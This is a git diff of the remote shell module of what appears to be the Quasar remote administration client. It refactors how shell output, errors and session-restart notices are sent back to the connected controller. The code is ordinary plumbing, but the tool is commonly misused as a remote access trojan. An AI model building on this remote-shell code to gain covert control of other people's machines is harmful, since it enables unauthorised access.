@@ -4,6 +4,7 @@ using System.Globalization;
 using System.IO;
 using System.Text;
 using System.Threading;
+using Quasar.Common.Messages;
 
 namespace xClient.Core.Utilities
 {
@@ -82,8 +83,10 @@ namespace xClient.Core.Utilities
             // Change console code page
             ExecuteCommand("chcp " + _encoding.CodePage);
 
-            new Packets.ClientPackets.DoShellExecuteResponse(Environment.NewLine + ">> New Session created" + Environment.NewLine).Execute(
-                Program.ConnectClient);
+            Program.ConnectClient.Send(new DoShellExecuteResponse
+            {
+                Output = Environment.NewLine + ">> New Session created" + Environment.NewLine
+            });
         }
 
         /// <summary>
@@ -141,16 +144,7 @@ namespace xClient.Core.Utilities
 
             if (string.IsNullOrEmpty(toSend)) return;
 
-            if (isError)
-            {
-                new Packets.ClientPackets.DoShellExecuteResponse(toSend, true).Execute(
-                    Program.ConnectClient);
-            }
-            else
-            {
-                new Packets.ClientPackets.DoShellExecuteResponse(toSend).Execute(
-                    Program.ConnectClient);
-            }
+            Program.ConnectClient.Send(new DoShellExecuteResponse {Output = toSend, IsError = isError});
 
             textbuffer.Length = 0;
         }
@@ -187,8 +181,13 @@ namespace xClient.Core.Utilities
             {
                 if (ex is ApplicationException || ex is InvalidOperationException)
                 {
-                    new Packets.ClientPackets.DoShellExecuteResponse(string.Format("{0}>> Session unexpectedly closed{0}",
-                        Environment.NewLine), true).Execute(Program.ConnectClient);
+                    Program.ConnectClient.Send(new DoShellExecuteResponse
+                    {
+                        Output = string.Format(
+                            "{0}>> Session unexpectedly closed{0}",
+                            Environment.NewLine),
+                        IsError = true
+                    });
 
                     CreateSession();
                 }
@@ -227,8 +226,13 @@ namespace xClient.Core.Utilities
             {
                 if (ex is ApplicationException || ex is InvalidOperationException)
                 {
-                    new Packets.ClientPackets.DoShellExecuteResponse(string.Format("{0}>> Session unexpectedly closed{0}",
-                        Environment.NewLine), true).Execute(Program.ConnectClient);
+                    Program.ConnectClient.Send(new DoShellExecuteResponse
+                    {
+                        Output = string.Format(
+                            "{0}>> Session unexpectedly closed{0}",
+                            Environment.NewLine),
+                        IsError = true
+                    });
 
                     CreateSession();
                 }
